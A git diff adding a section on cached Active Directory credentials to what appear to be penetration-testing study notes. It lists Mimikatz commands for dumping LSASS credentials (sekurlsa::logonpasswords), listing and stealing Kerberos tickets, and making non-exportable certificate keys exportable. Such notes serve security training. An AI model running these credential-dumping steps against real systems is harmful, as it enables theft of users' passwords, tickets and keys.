@@ -202,11 +202,34 @@ Ticket Granting Service Request (TGS-REQ)
 Ticket Granting Server Reply (TGS-REP)
 ```
 ## Cached AD Credentials
-
-
-
-
-
+```
+Local Security Authority Subsystem Service (LSASS)
+```
+- execute Mimikatz directly from memory using an injector like PowerShell
+- use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz
+```
+.\mimikatz.exe
+```
+- privilege::debug to engage the SeDebugPrivlege privilege, which will allow us to interact with a process owned by another account.
+```
+privilege::debug
+```
+- sekurlsa::logonpasswords to dump the credentials of all logged-on users
+```
+sekurlsa::logonpasswords
+```
+A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets.
+- List the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup. This will create and cache a service ticket.
+```
+dir \\web04.corp.com\backup
+```
+- Use Mimikatz to show the tickets that are stored in memory by entering `sekurlsa::tickets`.
+```
+sekurlsa::tickets
+```
+The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
+### Digital Certificates
+We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to either patch the CryptoAPI function with `crypto::capi` or KeyIso service with `crypto::cng`, making non-exportable keys exportable.
 
 
 
